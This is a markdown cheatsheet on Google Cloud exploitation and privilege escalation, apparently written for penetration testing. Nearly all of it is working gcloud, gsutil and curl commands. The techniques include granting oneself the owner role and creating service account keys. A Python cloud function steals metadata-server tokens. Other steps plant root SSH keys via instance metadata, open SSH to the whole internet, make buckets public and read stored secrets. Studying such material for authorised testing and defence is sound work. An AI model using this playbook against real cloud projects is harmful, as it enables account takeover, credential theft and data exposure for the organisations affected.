# Exploitation & Privilege Escalation
## Index
* [General](#General)
* [Enumeration](#Enumeration)
* [IAM Policy Permissions](#IAM-Policy-Permissions)
  * [Set IAM policy permission](#Set-IAM-policy-permission)
  * [Custom role permission update](#Custom-role-permission-update)
* [Service Account](#Service-Account)
  * [Service Account Key Admin](#Service-Account-Key-Admin)
  * [Service Account Impersonation](#Service-Account-Key-Admin)
  * [Service Account User](#Service-Account-User)
* [Cloud Functions](#Cloud-Functions)
  * [Cloud Function code update](#Cloud-Function-code-update)
* [Compute Instance](#Compute-Instance)
  * [OAuth Scope Manipulation](#OAuth-Scope-Manipulation)
  * [SetMetaData](#SetMetaData)
  * [OsLogin](#OsLogin)
  * [Token Extraction](#Token-Extraction)
* [Virtual Private Cloud](#Virtual-Private-Cloud)
  * [Firewall Rule Manipulation](#Firewall-Rule-Manipulation)
* [Cloud Storage](#Cloud-Storage)
  * [Change bucket policy](#Change-bucket-policy)
  * [Bucket access](#Bucket-access)
* [Secret Manager](#Secret-Manager)
* [Metadata server](#Metadata-server)

## General
- Interesting other cheatsheet: https://cloud.hacktricks.xyz/pentesting-cloud/gcp-pentesting/gcp-privilege-escalation

## Enumeration
- Make sure to check IAM privileges with a user that has access to read them of that folder/project/resource!

#### Check accessible projects
```
gcloud projects list
```

#### Set a project
```
gcloud config set project <PROJECT ID> 
```

#### Check IAM policy on project level
```
gcloud projects get-iam-policy <PROJECT ID>
gcloud projects get-iam-policy <PROJECT ID> --flatten="bindings[].members" --filter="bindings.members=user:<USER EMAIL>" --format="value(bindings.role)" 
```

#### Set GCUSER for oneliners:
```
GCUSER=<USER EMAIL>

GCUSER=$(gcloud auth list --filter=status:ACTIVE --format="value(account)")
```

#### Oneliner to check permissions of a user on all projects
```
gcloud projects list --format="value(PROJECT_NUMBER)" | while read project; do echo "\n [+] checking: $project\n" && gcloud projects get-iam-policy $project --flatten="bindings[].members" --filter="bindings.members=user:$GCUSER" --format="value(bindings.role)"; done
```

#### Oneliner to check permissions of a user on all service accounts
```
gcloud iam service-accounts list --format="value(email)" | while read serviceaccount; do echo "\n [+] checking: $serviceaccount\n" && gcloud iam service-accounts get-iam-policy $serviceaccount --flatten="bindings[].members" --filter="bindings.members=user:$GCUSER" --format="value(bindings.role)" 2>/dev/null; done
```

#### Oneliner to check permissions of a service account on all projects
```
gcloud projects list --format="value(PROJECT_NUMBER)" | while read project; do echo "\n [+] checking: $project\n" && gcloud projects get-iam-policy $project --flatten="bindings[].members" --filter="bindings.members=serviceAccount:$GCUSER" --format="value(bindings.role)"; done
```

#### Oneliner to check permissions of a service account on all service accounts
```
gcloud iam service-accounts list --format="value(email)" | while read serviceaccount; do echo "\n [+] checking: $serviceaccount\n" && gcloud iam service-accounts get-iam-policy $serviceaccount --flatten="bindings[].members" --filter="bindings.members=serviceAccount:$GCUSER" --format="value(bindings.role)" 2>/dev/null; done
```

#### List all permission in custom role
```
gcloud iam roles describe <ROLE> --project <PROJECT ID>
```

#### Short list for resources to check access to
- Gotta be extended
```
gcloud functions list
gcloud compute instances list
gcloud compute firewall-rules list
gcloud secrets list
gsutil ls
gcloud app instances list
gcloud sql instances list
gcloud spanner instances list
gcloud bigtable instances list
gcloud container clusters list
```

- With `--impersonate-service-account`
```
serviceaccount=<SERVICE ACCOUNT EMAIL>
gcloud functions list --impersonate-service-account $serviceaccount
gcloud compute instances list --impersonate-service-account $serviceaccount
gcloud compute firewall-rules list --impersonate-service-account $serviceaccount
gcloud secrets list --impersonate-service-account $serviceaccount
gcloud app instances list --impersonate-service-account $serviceaccount
gcloud sql instances list --impersonate-service-account $serviceaccount
gcloud spanner instances list --impersonate-service-account $serviceaccount
gcloud bigtable instances list --impersonate-service-account $serviceaccount
gcloud container clusters list --impersonate-service-account $serviceaccount
```

- With `--access-token-file=`
```
access-token-file="<PATH TO ACCESS TOKEN FILE>"
gcloud functions list --access-token-file=$access-token-file
gcloud compute instances list --access-token-file=$access-token-file
gcloud compute firewall-rules list --access-token-file=$access-token-file
gcloud secrets list --access-token-file=$access-token-file
gcloud app instances list --access-token-file=$access-token-file
gcloud sql instances list --access-token-file=$access-token-file
gcloud spanner instances list --access-token-file=$access-token-file
gcloud bigtable instances list --access-token-file=$access-token-file
gcloud container clusters list --access-token-file=$access-token-file
```

#### Check permissions on resource
- No easy command to enumerate all accesible resources. But example syntax would be:
```
gcloud functions get-iam-policy <NAME>
gcloud compute instances get-iam-policy <INSTANCE> --zone=<ZONE>
```

### Automated Tools
#### bf_my_gcp_permissions
- https://github.com/carlospolop/bf_my_gcp_permissions
```
accesstoken=$(gcloud auth print-access-token)
python3 bf_my_gcp_perms.py -t $accesstoken -p <PROJECT>
```

#### IAM Privilege Escalation
- https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation

#### Enumerate permissions on project
```
gcloud auth print-access-token

python3 enumerate_member_permissions.py --project-id <PROJECT ID>
```

#### Enumerate privesc
```
python3 check_for_privesc.py
```

#### Review the results 
- `all_org_folder_proj_sa_permissions.json` – All members and their associated privileges
- `privesc_methods.txt` – All detected privilege escalation methods
- `setIamPolicy_methods.txt` – All detected setIamPolicy method

## IAM Policy Permissions
- List of roles and permissions: https://cloud.google.com/iam/docs/understanding-roles#cloud-security-scanner-roles

### Set IAM policy permission
- User or Service account can set IAM policy on Org / Folder / Project or individual resource level
- Roles: `roles/resourcemanager.organizationAdmin`, `roles/owner`, `roles/[resource-admin]`
- Permissions:
  - Organization Level: `resourcemanager.organizations.setIamPolicy`
  - Folder Level: `resourcemanager.folders.setIamPolicy`
  - Project Level: `resourcemanager.projects.setIamPolicy`
  - Individual Resource Level: `iam.serviceaccounts.setiampolicy`, `compute.instances.setIamPolicy`, `storage.buckets.setIamPolicy` etc!
 
#### Adding a policy binding to the IAM policy of a project - User
```
gcloud projects add-iam-policy-binding <PROJECT ID> --member='user:<USER EMAIL>' --role='roles/owner'
```

#### Adds a policy binding to the IAM policy of a project - Service Account
```
gcloud projects add-iam-policy-binding <PROJECT ID> --member='serviceAccount:<USER EMAIL>' --role='roles/editor'
```

#### Retrieve the permissions of project for user
```
gcloud projects get-iam-policy <PROJECT ID> --flatten="bindings[].members" --filter="bindings.members=user:<USER EMAIL>" --format="value(bindings.role)"
```

### Custom role permission update
- Custom role contain user defined permission, can only be attached to organization or project level
- Roles: `roles/iam.organizationRoleAdmin`, `roles/iam.roleAdmin`
- Permissions: `iam.roles.update`

#### Set IAM policy on project level
- Add the permission `resourcemanager.projects.setIamPolicy`
```
gcloud iam roles update <ROLE NAME> --project=<PROJECT ID> --add-permissions=resourcemanager.projects.setIamPolicy
```

#### Get role permission
```
gcloud iam roles describe <ROLE NAME> --project=<PROJECT ID>
```

#### Making a user owner of the project
- Abusing the `resourcemanager.projects.setIamPolicy` permissions.
```
gcloud projects add-iam-policy-binding <PROJECT ID> --member='user:<USER EMAIL>' --role='roles/owner'
```

#### Retrieve the permissions of project for user
```
gcloud projects get-iam-policy alert-nimbus-335411 --flatten="bindings[].members" --filter="bindings.members=user:<USER EMAIL>" --format="value(bindings.role)"
```

## Service Account
- Three types of service accounts:
  - Default Service Account
    - They automatically created within a project. when a user create any compute workload. 
    - Format:
      - App engine default service account: `project-id@appspot.gserviceaccount.com`
      - Compute engine default service account: `project-number-compute@developer.gserviceaccount.com`
  - User Managed Service Account
    - Created and managed by end user when required. 
      - Format: `service-account-name@project-id.iam.gserviceaccount.com`
  - Google Managed Service Account
    - Used by gcp services when they need access to user resources on their behalf. 
    - Google API Service Agent format: `project-number@cloudservices.gserviceaccount.com`
- After compromising a service account check what type of service account it is. This might give a hint for what service the account is and what resource to abuse!

### Service Account Key Admin
- Key admin can create a new key for service account. Max 10 keys per service account.
- Roles: `roles/iam.serviceAccountAdmin`, `roles/iam.serviceAccountKeyAdmin`
- Permissions: `iam.serviceAccountkeys.create`

#### List keys associated with the specified service account
```
gcloud iam service-accounts keys list --iam-account <SERVICE ACCOUNT ID>
```

#### Create a new key for specified service account.
- Saves credentials in `key.json`
```
gcloud iam service-accounts keys create key.json --iam-account <SERVICE ACCOUNT ID>
```

#### Authenticate with key file
```
gcloud auth activate-service-account --key-file key.json
```

### Service Account Impersonation
- Roles: `roles/iam.serviceAccountTokenCreator`
- Permissions:
  - `iam.serviceAccounts.getAccessToken`: lets you create OAuth 2.0 access tokens
  - `iam.serviceAccounts.getOpenIdToken`: lets you create OpenID Connect (OICD) ID tokens
- This role lets the user impersonate service acounts. Allow principals to create short-lived credentials for service accounts, or to use the `--impersonate-service-account` flag for gcloud cli.

#### Create short-lived access token
```
gcloud auth print-access-token --impersonate-service-account <SERVICE ACCOUNT EMAIL>
```

#### Verify short-lived access token
```
curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=<ACCESS TOKEN>
```

#### Create short-lived identity token
```
gcloud auth print-identity-token --impersonate-service-account <SERVICE ACCOUNT EMAIL>
```

#### Verify short-lived identity token
```
curl https://www.googleapis.com/oauth2/v1/tokeninfo?id_token=<IDENTITY TOKEN>
```

#### Use token
- Save access token the file. Use the `--access-token-file=` with gcloud CLI to use the service account.
- Use the [google API](/cloud/gc/authenticated-enumeration.md#Enumeration-using-Google-Cloud-API)

### Service Account User
- Allows principals to indirectly access all the resources that the service account can acces.
- Principal can attach service account to any compute resource and access it’s permissions by taking it over.
- Roles: `roles/iam.serviceAccountUser`
- Permissions: `iam.serviceAccounts.actAs` & Enough permissions on a compute instance
- Possible to abuse if you can update/create a compute instance. Attach the service account and then take it over.
- Example is with `roles/cloudfunctions.admin` with cloud function!

#### Cloud function
- Python code to retrieve access token
```
import subprocess
import random
import io
import string
import json
import os
from urllib.request import Request, urlopen
from base64 import b64decode, b64encode

def hello_world(request):
    request_json = request.get_json()
    req = Request('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token')
    req.add_header('Metadata-Flavor', 'Google')
    content = urlopen(req).read()
    token = json.loads(content)
    req = Request('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=32555940559.apps.googleusercontent.com')
    req.add_header('Metadata-Flavor', 'Google')
    content = urlopen(req).read()
    token["identity"] = content.decode("utf-8")
    return json.dumps(token)
```

#### Create cloud function with attached service account
```
gcloud functions deploy <FUNCTION NAME> --timeout 539 --trigger-http --source <FUNCTION SOURCE DIRECTORY> --runtime python37 --entry-point hello_world --service-account <SERVICE ACCOUNT>
```

#### Invoke cloud function and retrieve temporary credential
```
gcloud functions call <FUNCTION NAME> --data '{}'
```

#### Use token
- Save access token the file. Use the `--access-token-file=` with gcloud CLI to use the service account.
- Use the [google API](/cloud/gc/authenticated-enumeration.md#Enumeration-using-Google-Cloud-API)

## Cloud Functions
#### List all cloud functions on project level
```
gcloud functions list
```

### Cloud Function code update
- Create a new function or modify the source code of any existing function.
- Roles: `roles/cloudfunctions.admin`
- Permissions: `cloudfunctions.functions.create`, `cloudfunctions.functions.update`, `cloudfunctions.functions.call`
- `iam.serviceAccounts.actAs` when a service account is in use

#### Create / Update existing cloud function source code
```
gcloud functions deploy <CLOUD FUNCTION NAME> --timeout 539 --source <PATH TO SOURCE CODE> --runtime python37
```

#### Invoke cloud function
```
gcloud functions call <CLOUD FUNCTION NAME> --data '{}'
```

#### Retrieve service account
```
gcloud functions describe <CLOUD FUNCTION NAME>
```

## Compute Instance
#### List all compute instances on project level
```
gcloud compute instances list
```

#### Get information about an instance
```
gcloud compute instances describe <INSTANCE>
```

### OAuth Scope Manipulation
- Oauth scope defines the access of the virtual machine?
- Roles: `roles/compute.admin`, `roles/compute.instanceAdmin`, `roles/compute.instanceAdmin.v1`, `Service Account User`
- Permissions: `compute.instances.setServiceAccount`

#### Stop compute instance
```
gcloud compute instances stop <INSTANCE>
```

#### Change service account or oauth scope
```
gcloud compute instances set-service-account <INSTANCE> --service-account <SERVICE ACCOUNT NAME> --scopes <SCOPE> --zone <ZONE>
```

#### Start compute instance
```
gcloud compute instances start <INSTANCE>
```

### SetMetaData
- Metadata contains SSH keys and can be set on project level or instance level. It is possible to add a ssh key
- Project Level
  - Roles: `roles/compute.instanceAdmin.v1`, `roles/iam.serviceAccountUser`
  - Permissions: `compute.projects.setCommonInstanceMetadata`, `iam.serviceAccounts.actAs`
- Instance Level
  - Roles: `roles/compute.instanceAdmin.v1`, `roles/iam.serviceAccountUser`
  - Permissions: `compute.instances.setMetadata`, `iam.serviceAccounts.actAs`
- Only works if `oslogin` is disabled


#### Get the information about project metadata
- Check if `enable-oslogin` is true.
```
gcloud compute project-info describe
```

#### Disable oslogin on project
```
gcloud compute project-info add-metadata --metadata enable-oslogin=FALSE
```

#### Generate ssh key pair in current directory
```
ssh-keygen -f ./id_rsa
```

#### Arrange ssh public key in this format in a file
```
username:ssh-rsa [AAAAB3NzaC1yc2EAAAADAQABAAABAQ]
```

#### Set ssh key value in the project metadata
```
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=<KEY FILE>
```

#### Set ssh key value in the instance metadata
```
gcloud compute instances add-metadata <VM NAME> --metadata-from-file ssh-keys=<KEY FILE>
```

#### Add a ssh key to existing list
- save metadata from project info and add your own user
```
username:ssh-rsa [AAAAB3NzaC1yc2EAAAADAQABAAABAQ]
username2:ssh-rsa [AAAAB3NzaC1yc2EAAAADAQABAAABAQ]
newusername:ssh-rsa [AAAAB3NzaC1yc2EAAAADAQABAAABAQ]
```

```
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```

### OsLogin
- OS Login is used to manage SSH access to gcp instances using IAM without having to create and manage individual SSH keys. 
- Oslogin allow two type of ssh access privilege. Root user & Non root user.
- Supports mfa
- Enabled by the metadata setting `enable-oslogin=TRUE`
- Roles: `roles/compute.osAdminLogin`, `roles/compute.osLogin`
- Permissions: `compute.instances.osAdminLogin`, `compute.instances.osLogin`

#### SSH to compute instance using oslogin.
```
gcloud compute ssh --zone=<ZONE> <VM NAME>
```

### Token Extraction
- After gaining command execution on a VM
- Can also be done by connecting to `http://169.254.169.254/`

#### Check service account
```
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
```

#### Set service account variable for following commands
```
SERVICEACCOUNT=<EMAIL>
```

#### Check email
```
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/$SERVICEACCOUNT/email"
```

#### Retrieve access token scope
```
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/$SERVICEACCOUNT/scopes"
```

#### Access token
```
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/$SERVICEACCOUNT/token"
```

#### Verify access token
```
curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=<ACCESS TOKEN>
```

#### Identity token
```
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/$SERVICEACCOUNT/identity"
```

#### Verify identity token
```
curl https://www.googleapis.com/oauth2/v1/tokeninfo?identity_token=[IdentityToken]
```

#### Retrieve IAM policy for service account
- See [Enumeration](#Enumeration)

## Virtual Private Cloud
### Firewall Rule Manipulation
- Roles: `roles/compute.admin`, `roles/compute.securityAdmin`
- Permissions: `compute.firewalls.create`, `compute.firewalls.update`, `compute.networks.updatePolicy`

#### List of all firewall rules on project level
```
gcloud compute firewall-rules list --format=json
```

#### List all compute instances on project level
```
gcloud compute instances list
```

#### Get information about an instance
```
gcloud compute instances describe <INSTANCE>
```

#### Create firewall rules for vpc
- Firewall Rules Targets - All Instance in the networks
```
gcloud compute firewall-rules create threat-rule --allow=tcp:22 --source-ranges="0.0.0.0/0" --direction=INGRESS
```

## Cloud Storage
- There are two type of IAM policy in cloud storage. 
  - Bucket Policy, uniform bucket-level access - Applied on bucket level and all objects within the bucket. 
  - ACL - Applied on individual object level. 
- Different type of principal identity in storage IAM.
  - allUsers - Unauthenticated users - anonymous access
  - allAuthenticatedUsers - all authenticated user which have google account
  - IAM - Users/ groups / service accounts within the same organization/ project control by IAM

### Change bucket policy
- Roles: `roles/storage.admin`
- Permissions: `storage.buckets.setIamPolicy`
- Use the `-i <SERVICE ACCOUNT>` parameter to use a service account.

#### Check if there are buckets
```
gsutil ls
```

#### List all roles attached to this bucket
```
gsutil iam get gs://<BUCKET NAME>
```

#### Add viewer role for allUsers
- Use the `-i <SERVICE ACCOUNT>` parameter to use a service account.
```
gsutil iam ch allUsers:objectViewer gs://prod-storage-metatech
```

#### Add an admin role for allUsers
- Use the `-i <SERVICE ACCOUNT>` parameter to use a service account.
```
gsutil iam ch allUsers:admin gs://<BUCKET NAME>
```

### Enum buckets unauthenticated
#### Get the gcp bucket subdomain for an organization
- https://github.com/initstring/cloud_enum
```
python3 cloudenum.py -k <KEYWORD>
```

#### Get the information about objects in a bucket
```
curl https://storage.googleapis.com/<BUCKET NAME>
```

#### Get the information about iam permission attached to the bucket
```
https://www.googleapis.com/storage/v1/b/<BUCKET NAME>/iam/testPermissions?permissions=[storage.buckets.dele
te&permissions=storage.buckets.get&permissions=storage.buckets.getIamPolicy&permissions=storage.buckets.setIamPo
licy&permissions=storage.buckets.update&permissions=storage.objects.create&permissions=storage.objects.delete&per
missions=storage.objects.get&permissions=storage.objects.list&permissions=storage.objects.update] 
```


### Bucket access
#### Check if user has default service account access
- Look for the standard default service account name that look like: 
  - PROJECT_NUMBER-compute@developer.gserviceaccount.com
  - PROJECT_ID@appspot.gserviceaccount.com
- Use service account to access buckets looking for other creds or sensitive data
```
gcloud config list
```

## Secret Manager
- Permissions are defined on secret manager
  - Project wide 
  - Individual secret wide 
- Roles: `roles/owner`, `roles/secretmanager.admin`, `roles/secretmanager.secretAccessor`
- Permissions: `secretmanager.versions.access`

#### List all secrets by name on project level
```
gcloud secrets list
```

#### List versions for a secret
```
gcloud secrets versions list <SECRET>
```

#### Read secret
```
gcloud secrets versions access --secret <SECRET> <VERSION>
```

## Metadata server
- Metadata  endpoint on instances at 169.254.169.254
- Any public SSH keys in the metadata server get an account with root access setup
- If you can set a public key on the metadata server it will setup a brand new Linux account for you on the instance
- Need default perms set to “full access to Cloud APIs” or compute API access
  - Or… custom IAM perms: 
    - compute.instances.setMetadata
    - compute.projects.setCommonInstanceMetadata

### Create SSH key for a new username
```
ssh-keygen -t rsa -C "<USER>" -f ./<FILENAME>.key -P ""
```

#### Copy the username and key data into a file called metadata.txt in the following format:
```
<USERNAME>:<public key data in usernamekey.pub>
```

#### Update the instance metadata
```
gcloud compute instances add-metadata <instance name> --metadata-from-file ssh-keys=metadata.txt
```

#### SSH into the machine
- Now when the daemon runs it will add a new user with root privileges. Use your newly generated SSH key to SSH in.
